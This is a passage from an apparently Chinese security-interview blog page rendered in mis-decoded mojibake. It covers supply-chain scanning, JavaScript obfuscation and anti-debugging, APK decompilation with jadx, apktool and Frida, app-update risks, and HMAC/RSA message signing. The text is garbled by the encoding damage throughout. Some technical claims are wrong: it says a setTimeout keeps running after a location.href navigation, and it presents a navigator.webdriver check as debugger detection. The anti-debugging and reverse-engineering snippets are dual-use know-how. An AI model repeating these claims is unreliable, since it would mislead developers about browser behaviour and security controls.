å¯ç”¨å¹‚ç­‰æ€§æ£€æŸ¥ï¼Œé˜²æ­¢å…³é”®äº¤æ˜“è¢«é‡å¤æ‰§è¡Œã€‚"></a><strong>ä¿®å¤ç­–ç•¥</strong>ï¼š<br>- <strong>åç«¯å¼ºåˆ¶æƒé™æ ¡éªŒ</strong>ï¼Œé¿å…ä»…ä¾èµ–å‰ç«¯é™åˆ¶ã€‚<br>- <strong>å¯ç”¨å¹‚ç­‰æ€§æ£€æŸ¥</strong>ï¼Œé˜²æ­¢å…³é”®äº¤æ˜“è¢«é‡å¤æ‰§è¡Œã€‚</h2><h3 id="è½¯ä»¶ä¾›åº”é“¾åé—¨æ¼æ´å¦‚ä½•ç³»ç»Ÿè§„é¿ï¼Ÿ"><a href="#è½¯ä»¶ä¾›åº”é“¾åé—¨æ¼æ´å¦‚ä½•ç³»ç»Ÿè§„é¿ï¼Ÿ" class="headerlink" title="è½¯ä»¶ä¾›åº”é“¾åé—¨æ¼æ´å¦‚ä½•ç³»ç»Ÿè§„é¿ï¼Ÿ"></a><strong>è½¯ä»¶ä¾›åº”é“¾åé—¨æ¼æ´å¦‚ä½•ç³»ç»Ÿè§„é¿ï¼Ÿ</strong></h3><p><strong>ä¸»è¦é£é™©</strong>ï¼š</p><ul><li>ä¾›åº”é“¾æ”»å‡»å¯èƒ½é€šè¿‡ <strong>ç¬¬ä¸‰æ–¹åº“ã€å¼€æºç»„ä»¶</strong> æ¤å…¥æ¶æ„ä»£ç ï¼Œå¦‚ <strong>äº‹ä»¶æµï¼ˆEventStreamï¼‰åé—¨</strong> äº‹ä»¶ã€‚</li></ul><p><strong>é˜²èŒƒæªæ–½</strong>ï¼š</p><ol><li><strong>ä½¿ç”¨å¯ä¿¡èµ–çš„è½¯ä»¶ä»“åº“</strong>ï¼š<ul><li>é‡‡ç”¨ <strong>npm auditã€pip check</strong> ç­‰å·¥å…·æ£€æµ‹ä¾èµ–æ¼æ´ã€‚</li></ul></li><li><strong>å¯ç”¨ SCAï¼ˆè½¯ä»¶æˆåˆ†åˆ†æï¼‰</strong>ï¼š<ul><li>ä½¿ç”¨ <strong>Sonatype Nexusã€Snyk</strong> ç›‘æµ‹ä¾èµ–å®‰å…¨æ€§ã€‚</li></ul></li><li><strong>å¼ºåˆ¶ä»£ç å®¡è®¡</strong>ï¼š<ul><li>é‡‡ç”¨ <strong>CodeQL</strong> åˆ†æä¾›åº”é“¾ä»£ç ï¼Œå‘ç°æ¶æ„ä»£ç ç‰‡æ®µã€‚</li></ul></li></ol><h2 id="ç¤ºä¾‹ï¼šä½¿ç”¨-Snyk-æ‰«æ-Node-js-ä¾èµ–ï¼š"><a href="#ç¤ºä¾‹ï¼šä½¿ç”¨-Snyk-æ‰«æ-Node-js-ä¾èµ–ï¼š" class="headerlink" title="ç¤ºä¾‹ï¼šä½¿ç”¨ Snyk æ‰«æ Node.js ä¾èµ–ï¼š"></a><strong>ç¤ºä¾‹ï¼šä½¿ç”¨ Snyk æ‰«æ Node.js ä¾èµ–</strong>ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snyk <span class="built_in">test</span></span><br></pre></td></tr></table></figure></h2><h3 id="å‰ç«¯-JavaScript-ä»£ç å¦‚ä½•æ··æ·†ä»¥åŠåè°ƒè¯•ï¼Ÿ"><a href="#å‰ç«¯-JavaScript-ä»£ç å¦‚ä½•æ··æ·†ä»¥åŠåè°ƒè¯•ï¼Ÿ" class="headerlink" title="å‰ç«¯ JavaScript ä»£ç å¦‚ä½•æ··æ·†ä»¥åŠåè°ƒè¯•ï¼Ÿ"></a><strong>å‰ç«¯ JavaScript ä»£ç å¦‚ä½•æ··æ·†ä»¥åŠåè°ƒè¯•ï¼Ÿ</strong></h3><p><strong>æ··æ·†æŠ€æœ¯</strong>ï¼š</p><ol><li><strong>ä»£ç ç»“æ„æ‰“ä¹±</strong>ï¼š<ul><li>æ’å…¥æ— ç”¨ä»£ç ï¼Œä½¿é€»è¾‘éš¾ä»¥é˜…è¯»å’Œåˆ†æã€‚</li></ul></li><li><strong>å˜é‡åä¿®æ”¹</strong>ï¼š<ul><li>å°†å˜é‡åæ›¿æ¢ä¸ºéšæœºå­—ç¬¦ä¸²ï¼š<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">&quot;secret&quot;</span>; <span class="comment">// åŸä»£ç </span></span><br><span class="line"><span class="keyword">var</span> _0x1a3b4 = <span class="string">&quot;secret&quot;</span>; <span class="comment">// æ··æ·†å</span></span><br></pre></td></tr></table></figure></li></ul></li><li><strong>å­—ç¬¦ä¸²åŠ å¯†</strong>ï¼š<ul><li>ä½¿ç”¨ <strong>RC4</strong> æˆ– <strong>Base64</strong> ç¼–ç ä¿æŠ¤å­—ç¬¦ä¸²ï¼š<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="title function_">atob</span>(<span class="string">&quot;c2VjcmV0&quot;</span>); <span class="comment">// &quot;secret&quot;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><strong>Unicode è½¬æ¢</strong>ï¼š<ul><li>ä»£ç è½¬æ¢ä¸º Unicode è¡¨ç¤ºï¼š<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;\u0068\u0065\u006c\u006c\u006f&quot;</span>; <span class="comment">// &quot;hello&quot;</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><h2 id="åè°ƒè¯•æŠ€æœ¯ï¼š1-ç¦ç”¨å¼€å‘è€…å·¥å…·ï¼š-ç›‘å¬-DevTools-æ‰“å¼€çŠ¶æ€ï¼Œè§¦å‘-debuggerï¼š-2-æ‹¦æˆª-console-è°ƒè¯•ï¼š-ç¦ç”¨-console-ï¼š-3-ä»£ç è‡ªæ¯æœºåˆ¶ï¼š-å½“ä»£ç æ£€æµ‹åˆ°-DevTools-è¿è¡Œæ—¶ï¼Œä¿®æ”¹å…³é”®å˜é‡æˆ–ç»ˆæ­¢æ‰§è¡Œï¼š"><a href="#åè°ƒè¯•æŠ€æœ¯ï¼š1-ç¦ç”¨å¼€å‘è€…å·¥å…·ï¼š-ç›‘å¬-DevTools-æ‰“å¼€çŠ¶æ€ï¼Œè§¦å‘-debuggerï¼š-2-æ‹¦æˆª-console-è°ƒè¯•ï¼š-ç¦ç”¨-console-ï¼š-3-ä»£ç è‡ªæ¯æœºåˆ¶ï¼š-å½“ä»£ç æ£€æµ‹åˆ°-DevTools-è¿è¡Œæ—¶ï¼Œä¿®æ”¹å…³é”®å˜é‡æˆ–ç»ˆæ­¢æ‰§è¡Œï¼š" class="headerlink" title="åè°ƒè¯•æŠ€æœ¯ï¼š1. ç¦ç”¨å¼€å‘è€…å·¥å…·ï¼š   - ç›‘å¬ DevTools æ‰“å¼€çŠ¶æ€ï¼Œè§¦å‘ debuggerï¼š     2. æ‹¦æˆª console è°ƒè¯•ï¼š   - ç¦ç”¨ console.*ï¼š     3. ä»£ç è‡ªæ¯æœºåˆ¶ï¼š   - å½“ä»£ç æ£€æµ‹åˆ° DevTools è¿è¡Œæ—¶ï¼Œä¿®æ”¹å…³é”®å˜é‡æˆ–ç»ˆæ­¢æ‰§è¡Œï¼š     "></a><strong>åè°ƒè¯•æŠ€æœ¯</strong>ï¼š<br>1. <strong>ç¦ç”¨å¼€å‘è€…å·¥å…·</strong>ï¼š<br>   - ç›‘å¬ <code>DevTools</code> æ‰“å¼€çŠ¶æ€ï¼Œè§¦å‘ <code>debugger</code>ï¼š<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Checking DevTools...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">outerHeight</span> - <span class="variable language_">window</span>.<span class="property">innerHeight</span> &gt; <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><br>2. <strong>æ‹¦æˆª <code>console</code> è°ƒè¯•</strong>ï¼š<br>   - ç¦ç”¨ <code>console.*</code>ï¼š<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="property">log</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;;</span><br></pre></td></tr></table></figure><br>3. <strong>ä»£ç è‡ªæ¯æœºåˆ¶</strong>ï¼š<br>   - å½“ä»£ç æ£€æµ‹åˆ° <code>DevTools</code> è¿è¡Œæ—¶ï¼Œä¿®æ”¹å…³é”®å˜é‡æˆ–ç»ˆæ­¢æ‰§è¡Œï¼š<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">navigator</span>.<span class="property">webdriver</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;Debugger detected!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></h2><h3 id="å¦‚ä½•å®ç°å½“å‰é¡µé¢-location-href-æ”¹å˜åï¼Œä»ç„¶èƒ½æ‰§è¡Œä¹‹å‰çš„-JavaScriptï¼Ÿ"><a href="#å¦‚ä½•å®ç°å½“å‰é¡µé¢-location-href-æ”¹å˜åï¼Œä»ç„¶èƒ½æ‰§è¡Œä¹‹å‰çš„-JavaScriptï¼Ÿ" class="headerlink" title="å¦‚ä½•å®ç°å½“å‰é¡µé¢ location.href æ”¹å˜åï¼Œä»ç„¶èƒ½æ‰§è¡Œä¹‹å‰çš„ JavaScriptï¼Ÿ"></a><strong>å¦‚ä½•å®ç°å½“å‰é¡µé¢ <code>location.href</code> æ”¹å˜åï¼Œä»ç„¶èƒ½æ‰§è¡Œä¹‹å‰çš„ JavaScriptï¼Ÿ</strong></h3><h2 id="æ–¹æ³•ï¼š1-ä½¿ç”¨-setTimeout-æ‰§è¡Œå»¶è¿Ÿä»»åŠ¡ï¼š-JavaScript-çš„-setTimeout-æ–¹æ³•ä¸ä¼šè¢«-location-href-å½±å“ï¼Œå¯ç”¨äºå»¶è¿Ÿæ‰§è¡Œä»£ç ï¼š-2-ä½¿ç”¨-window-onbeforeunload-ç›‘å¬è·³è½¬ï¼š-åœ¨é¡µé¢è·³è½¬å‰æ‰§è¡Œä»£ç ï¼š-3-Service-Worker-æ–¹å¼ï¼š-é€šè¿‡-Service-Worker-æŒç»­è¿è¡Œ-JS-é€»è¾‘ï¼Œå³ä½¿é¡µé¢è·³è½¬ï¼š"><a href="#æ–¹æ³•ï¼š1-ä½¿ç”¨-setTimeout-æ‰§è¡Œå»¶è¿Ÿä»»åŠ¡ï¼š-JavaScript-çš„-setTimeout-æ–¹æ³•ä¸ä¼šè¢«-location-href-å½±å“ï¼Œå¯ç”¨äºå»¶è¿Ÿæ‰§è¡Œä»£ç ï¼š-2-ä½¿ç”¨-window-onbeforeunload-ç›‘å¬è·³è½¬ï¼š-åœ¨é¡µé¢è·³è½¬å‰æ‰§è¡Œä»£ç ï¼š-3-Service-Worker-æ–¹å¼ï¼š-é€šè¿‡-Service-Worker-æŒç»­è¿è¡Œ-JS-é€»è¾‘ï¼Œå³ä½¿é¡µé¢è·³è½¬ï¼š" class="headerlink" title="æ–¹æ³•ï¼š1. ä½¿ç”¨ setTimeout æ‰§è¡Œå»¶è¿Ÿä»»åŠ¡ï¼š   - JavaScript çš„ setTimeout æ–¹æ³•ä¸ä¼šè¢« location.href å½±å“ï¼Œå¯ç”¨äºå»¶è¿Ÿæ‰§è¡Œä»£ç ï¼š     2. ä½¿ç”¨ window.onbeforeunload ç›‘å¬è·³è½¬ï¼š   - åœ¨é¡µé¢è·³è½¬å‰æ‰§è¡Œä»£ç ï¼š     3. Service Worker æ–¹å¼ï¼š   - é€šè¿‡ Service Worker æŒç»­è¿è¡Œ JS é€»è¾‘ï¼Œå³ä½¿é¡µé¢è·³è½¬ï¼š     "></a><strong>æ–¹æ³•</strong>ï¼š<br>1. <strong>ä½¿ç”¨ <code>setTimeout</code> æ‰§è¡Œå»¶è¿Ÿä»»åŠ¡</strong>ï¼š<br>   - JavaScript çš„ <code>setTimeout</code> æ–¹æ³•ä¸ä¼šè¢« <code>location.href</code> å½±å“ï¼Œå¯ç”¨äºå»¶è¿Ÿæ‰§è¡Œä»£ç ï¼š<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;This runs even after page change!&quot;</span>);</span><br><span class="line">&#125;, <span class="number">3000</span>);</span><br><span class="line">location.<span class="property">href</span> = <span class="string">&quot;https://example.com&quot;</span>;</span><br></pre></td></tr></table></figure><br>2. <strong>ä½¿ç”¨ <code>window.onbeforeunload</code> ç›‘å¬è·³è½¬</strong>ï¼š<br>   - åœ¨é¡µé¢è·³è½¬å‰æ‰§è¡Œä»£ç ï¼š<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onbeforeunload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Page is leaving...&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Are you sure?&quot;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br>3. <strong>Service Worker æ–¹å¼</strong>ï¼š<br>   - é€šè¿‡ <code>Service Worker</code> æŒç»­è¿è¡Œ JS é€»è¾‘ï¼Œå³ä½¿é¡µé¢è·³è½¬ï¼š<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">navigator.<span class="property">serviceWorker</span>.<span class="title function_">register</span>(<span class="string">&#x27;/worker.js&#x27;</span>).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Service Worker Registered!&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></h2><h3 id="APK-åç¼–è¯‘æœ‰å“ªå‡ ç§è·¯å¾„ï¼Œä»£è¡¨å·¥å…·æœ‰å“ªäº›ï¼Ÿ"><a href="#APK-åç¼–è¯‘æœ‰å“ªå‡ ç§è·¯å¾„ï¼Œä»£è¡¨å·¥å…·æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="APK åç¼–è¯‘æœ‰å“ªå‡ ç§è·¯å¾„ï¼Œä»£è¡¨å·¥å…·æœ‰å“ªäº›ï¼Ÿ"></a><strong>APK åç¼–è¯‘æœ‰å“ªå‡ ç§è·¯å¾„ï¼Œä»£è¡¨å·¥å…·æœ‰å“ªäº›ï¼Ÿ</strong></h3><p><strong>åç¼–è¯‘è·¯å¾„</strong>ï¼š</p><ol><li><p><strong>DEX åç¼–è¯‘ï¼ˆDalvik Executableï¼‰</strong>ï¼š</p><ul><li>å°† <code>classes.dex</code> è¿˜åŸä¸º Java ä»£ç ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jadx -d output/ app.apk</span><br></pre></td></tr></table></figure></li><li><strong>å·¥å…·</strong>ï¼š<code>JADX</code>ã€<code>dex2jar</code>ã€<code>Bytecode Viewer</code></li></ul></li><li><p><strong>èµ„æºæ–‡ä»¶æå–</strong>ï¼š</p><ul><li>è·å– <code>AndroidManifest.xml</code>ã€<code>res</code> ç›®å½•å†…å®¹ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d app.apk -o output/</span><br></pre></td></tr></table></figure></li><li><strong>å·¥å…·</strong>ï¼š<code>Apktool</code></li></ul></li><li><p><strong>åŠ¨æ€è°ƒè¯•ï¼ˆHook æŠ€æœ¯ï¼‰</strong>ï¼š</p><ul><li>é€šè¿‡ <code>Frida</code>ã€<code>Xposed</code> åœ¨è¿è¡Œæ—¶ä¿®æ”¹åº”ç”¨è¡Œä¸ºï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -n target_app -e <span class="string">&quot;Java.perform(() =&gt; &#123; console.log(&#x27;Hooked!&#x27;); &#125;)&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>å·¥å…·</strong>ï¼š<code>Frida</code>ã€<code>Xposed</code></li></ul></li></ol><h2 id="é˜²å¾¡æªæ–½ï¼š-å¼€å¯-ProGuard-è¿›è¡Œä»£ç æ··æ·†ï¼š-ä½¿ç”¨-Native-C-ä»£ç ä¿æŠ¤å…³é”®é€»è¾‘ï¼Œé¿å…-Java-å±‚è¢«è½»æ˜“åç¼–è¯‘ã€‚"><a href="#é˜²å¾¡æªæ–½ï¼š-å¼€å¯-ProGuard-è¿›è¡Œä»£ç æ··æ·†ï¼š-ä½¿ç”¨-Native-C-ä»£ç ä¿æŠ¤å…³é”®é€»è¾‘ï¼Œé¿å…-Java-å±‚è¢«è½»æ˜“åç¼–è¯‘ã€‚" class="headerlink" title="é˜²å¾¡æªæ–½ï¼š- å¼€å¯ ProGuard è¿›è¡Œä»£ç æ··æ·†ï¼š  - ä½¿ç”¨ Native C++ ä»£ç ä¿æŠ¤å…³é”®é€»è¾‘ï¼Œé¿å… Java å±‚è¢«è½»æ˜“åç¼–è¯‘ã€‚"></a><strong>é˜²å¾¡æªæ–½</strong>ï¼š<br>- <strong>å¼€å¯ ProGuard</strong> è¿›è¡Œä»£ç æ··æ·†ï¼š<br>  <figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">minifyEnabled <span class="keyword">true</span></span><br><span class="line">proguardFiles getDefaultProguardFile(<span class="string">&#x27;proguard-android-optimize.txt&#x27;</span>), <span class="string">&#x27;proguard-rules.pro&#x27;</span></span><br></pre></td></tr></table></figure><br>- <strong>ä½¿ç”¨ Native C++ ä»£ç ä¿æŠ¤å…³é”®é€»è¾‘</strong>ï¼Œé¿å… Java å±‚è¢«è½»æ˜“åç¼–è¯‘ã€‚</h2><h3 id="App-è‡ªæ£€å‡çº§åœºæ™¯ä¸‹ä¼šå­˜åœ¨å“ªäº›é£é™©ï¼Ÿ"><a href="#App-è‡ªæ£€å‡çº§åœºæ™¯ä¸‹ä¼šå­˜åœ¨å“ªäº›é£é™©ï¼Ÿ" class="headerlink" title="App è‡ªæ£€å‡çº§åœºæ™¯ä¸‹ä¼šå­˜åœ¨å“ªäº›é£é™©ï¼Ÿ"></a><strong>App è‡ªæ£€å‡çº§åœºæ™¯ä¸‹ä¼šå­˜åœ¨å“ªäº›é£é™©ï¼Ÿ</strong></h3><p><strong>ä¸»è¦é£é™©</strong>ï¼š</p><ol><li><strong>ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰</strong>ï¼š<ul><li>å‡çº§åŒ…ä¸‹è½½è¿‡ç¨‹ä¸­è‹¥æœªä½¿ç”¨ HTTPSï¼Œæ”»å‡»è€…å¯ç¯¡æ”¹æ–‡ä»¶ã€‚</li></ul></li><li><strong>ä¼ªé€ æ›´æ–°åŒ…</strong>ï¼š<ul><li>æœåŠ¡å™¨æœªè¿›è¡Œç­¾åæ ¡éªŒï¼Œæ”»å‡»è€…å¯ä¼ªé€ æ›´æ–°åŒ…ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚</li></ul></li><li><strong>æƒé™æå‡</strong>ï¼š<ul><li>æ›´æ–°è¿‡ç¨‹ä¸­è‹¥æ¶‰åŠåŠ¨æ€åŠ è½½ <code>dex</code> æˆ– <code>so</code>ï¼Œå¯èƒ½è¢«æ»¥ç”¨å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ã€‚</li></ul></li><li><strong>æ›´æ–°åŠ«æŒ</strong>ï¼š<ul><li>ä½ç‰ˆæœ¬ç³»ç»Ÿå¯èƒ½è¢« <code>app hijacking</code> æ”»å‡»ï¼Œå¯¼è‡´è·³è½¬åˆ°æ¶æ„åº”ç”¨ä¸‹è½½é¡µé¢ã€‚</li></ul></li></ol><h2 id="é˜²æŠ¤æªæ–½ï¼š-å¼ºåˆ¶ä½¿ç”¨-HTTPS-è¿›è¡Œæ›´æ–°åŒ…ä¼ è¾“ï¼Œé˜²æ­¢æµé‡ç¯¡æ”¹ã€‚-ç­¾åæ ¡éªŒï¼Œæ›´æ–°åŒ…éœ€è¿›è¡Œ-SHA256-æ ¡éªŒï¼š-å®Œæ•´æ€§æ£€æŸ¥ï¼Œæ ¡éªŒ-AndroidManifest-xml-åŠ-dexï¼Œé˜²æ­¢åŠ¨æ€åŠ è½½æ¶æ„ä»£ç ã€‚"><a href="#é˜²æŠ¤æªæ–½ï¼š-å¼ºåˆ¶ä½¿ç”¨-HTTPS-è¿›è¡Œæ›´æ–°åŒ…ä¼ è¾“ï¼Œé˜²æ­¢æµé‡ç¯¡æ”¹ã€‚-ç­¾åæ ¡éªŒï¼Œæ›´æ–°åŒ…éœ€è¿›è¡Œ-SHA256-æ ¡éªŒï¼š-å®Œæ•´æ€§æ£€æŸ¥ï¼Œæ ¡éªŒ-AndroidManifest-xml-åŠ-dexï¼Œé˜²æ­¢åŠ¨æ€åŠ è½½æ¶æ„ä»£ç ã€‚" class="headerlink" title="é˜²æŠ¤æªæ–½ï¼š- å¼ºåˆ¶ä½¿ç”¨ HTTPS è¿›è¡Œæ›´æ–°åŒ…ä¼ è¾“ï¼Œé˜²æ­¢æµé‡ç¯¡æ”¹ã€‚- ç­¾åæ ¡éªŒï¼Œæ›´æ–°åŒ…éœ€è¿›è¡Œ SHA256 æ ¡éªŒï¼š  - å®Œæ•´æ€§æ£€æŸ¥ï¼Œæ ¡éªŒ AndroidManifest.xml åŠ dexï¼Œé˜²æ­¢åŠ¨æ€åŠ è½½æ¶æ„ä»£ç ã€‚"></a><strong>é˜²æŠ¤æªæ–½</strong>ï¼š<br>- <strong>å¼ºåˆ¶ä½¿ç”¨ HTTPS</strong> è¿›è¡Œæ›´æ–°åŒ…ä¼ è¾“ï¼Œé˜²æ­¢æµé‡ç¯¡æ”¹ã€‚<br>- <strong>ç­¾åæ ¡éªŒ</strong>ï¼Œæ›´æ–°åŒ…éœ€è¿›è¡Œ <strong>SHA256 æ ¡éªŒ</strong>ï¼š<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;SHA-256&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] digest = md.digest(fileBytes);</span><br></pre></td></tr></table></figure><br>- <strong>å®Œæ•´æ€§æ£€æŸ¥</strong>ï¼Œæ ¡éªŒ <code>AndroidManifest.xml</code> åŠ <code>dex</code>ï¼Œé˜²æ­¢åŠ¨æ€åŠ è½½æ¶æ„ä»£ç ã€‚</h2><h3 id="å¦‚ä½•è®¾è®¡ä¸€å¥—é€šä¿¡æœºåˆ¶ï¼Œèƒ½å¤Ÿä¿è¯ä¼ è¾“è¿‡ç¨‹ä¸­çš„å®Œæ•´æ€§ã€ä¸å¯æŠµèµ–æ€§ä»¥åŠé˜²æ­¢é‡æ”¾ï¼Ÿ"><a href="#å¦‚ä½•è®¾è®¡ä¸€å¥—é€šä¿¡æœºåˆ¶ï¼Œèƒ½å¤Ÿä¿è¯ä¼ è¾“è¿‡ç¨‹ä¸­çš„å®Œæ•´æ€§ã€ä¸å¯æŠµèµ–æ€§ä»¥åŠé˜²æ­¢é‡æ”¾ï¼Ÿ" class="headerlink" title="å¦‚ä½•è®¾è®¡ä¸€å¥—é€šä¿¡æœºåˆ¶ï¼Œèƒ½å¤Ÿä¿è¯ä¼ è¾“è¿‡ç¨‹ä¸­çš„å®Œæ•´æ€§ã€ä¸å¯æŠµèµ–æ€§ä»¥åŠé˜²æ­¢é‡æ”¾ï¼Ÿ"></a><strong>å¦‚ä½•è®¾è®¡ä¸€å¥—é€šä¿¡æœºåˆ¶ï¼Œèƒ½å¤Ÿä¿è¯ä¼ è¾“è¿‡ç¨‹ä¸­çš„å®Œæ•´æ€§ã€ä¸å¯æŠµèµ–æ€§ä»¥åŠé˜²æ­¢é‡æ”¾ï¼Ÿ</strong></h3><h2 id="è®¾è®¡åŸåˆ™ï¼š1-å®Œæ•´æ€§ï¼š-é‡‡ç”¨-HMAC-SHA256-ç­¾åï¼Œç¡®ä¿æ¶ˆæ¯æœªè¢«ç¯¡æ”¹ï¼š-2-ä¸å¯æŠµèµ–æ€§ï¼š-ä½¿ç”¨-RSA-ç­¾å-ç¡®ä¿æ¶ˆæ¯æ¥æºå¯ä¿¡ï¼š-3-é˜²æ­¢é‡æ”¾æ”»å‡»ï¼š-é‡‡ç”¨-æ—¶é—´æˆ³-éšæœºæ•°ï¼ˆnonceï¼‰ï¼Œç¡®ä¿æ¯æ¬¡è¯·æ±‚å”¯ä¸€ï¼š-æœåŠ¡å™¨ç«¯å­˜å‚¨-nonceï¼Œé¿å…ç›¸åŒè¯·æ±‚é‡å¤æäº¤ã€‚"><a href="#è®¾è®¡åŸåˆ™ï¼š1-å®Œæ•´æ€§ï¼š-é‡‡ç”¨-HMAC-SHA256-ç­¾åï¼Œç¡®ä¿æ¶ˆæ¯æœªè¢«ç¯¡æ”¹ï¼š-2-ä¸å¯æŠµèµ–æ€§ï¼š-ä½¿ç”¨-RSA-ç­¾å-ç¡®ä¿æ¶ˆæ¯æ¥æºå¯ä¿¡ï¼š-3-é˜²æ­¢é‡æ”¾æ”»å‡»ï¼š-é‡‡ç”¨-æ—¶é—´æˆ³-éšæœºæ•°ï¼ˆnonceï¼‰ï¼Œç¡®ä¿æ¯æ¬¡è¯·æ±‚å”¯ä¸€ï¼š-æœåŠ¡å™¨ç«¯å­˜å‚¨-nonceï¼Œé¿å…ç›¸åŒè¯·æ±‚é‡å¤æäº¤ã€‚" class="headerlink" title="è®¾è®¡åŸåˆ™ï¼š1. å®Œæ•´æ€§ï¼š   - é‡‡ç”¨ HMAC-SHA256 ç­¾åï¼Œç¡®ä¿æ¶ˆæ¯æœªè¢«ç¯¡æ”¹ï¼š     2. ä¸å¯æŠµèµ–æ€§ï¼š   - ä½¿ç”¨ RSA ç­¾å ç¡®ä¿æ¶ˆæ¯æ¥æºå¯ä¿¡ï¼š     3. é˜²æ­¢é‡æ”¾æ”»å‡»ï¼š   - é‡‡ç”¨ æ—¶é—´æˆ³ + éšæœºæ•°ï¼ˆnonceï¼‰ï¼Œç¡®ä¿æ¯æ¬¡è¯·æ±‚å”¯ä¸€ï¼š        - æœåŠ¡å™¨ç«¯å­˜å‚¨ nonceï¼Œé¿å…ç›¸åŒè¯·æ±‚é‡å¤æäº¤ã€‚"></a><strong>è®¾è®¡åŸåˆ™</strong>ï¼š<br>1. <strong>å®Œæ•´æ€§</strong>ï¼š<br>   - é‡‡ç”¨ <strong>HMAC-SHA256 ç­¾å</strong>ï¼Œç¡®ä¿æ¶ˆæ¯æœªè¢«ç¯¡æ”¹ï¼š<br>     <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Mac</span> <span class="variable">mac</span> <span class="operator">=</span> Mac.getInstance(<span class="string">&quot;HmacSHA256&quot;</span>);</span><br><span class="line">mac.init(<span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(secretKey.getBytes(), <span class="string">&quot;HmacSHA256&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[] hash = mac.doFinal(message.getBytes());</span><br></pre></td></tr></table></figure><br>2. <strong>ä¸å¯æŠµèµ–æ€§</strong>ï¼š<br>   - ä½¿ç”¨ <strong>RSA ç­¾å</strong> ç¡®ä¿æ¶ˆæ¯æ¥æºå¯ä¿¡ï¼š<br>     <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Signature</span> <span class="variable">sign</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;SHA256withRSA&quot;</span>);</span><br><span class="line">sign.initSign(privateKey);</span><br><span class="line">sign.update(message.getBytes());</span><br><span class="line"><span class="type">byte</span>[] signature = sign.sign();</span><br></pre></td></tr></table></figure><br>3. 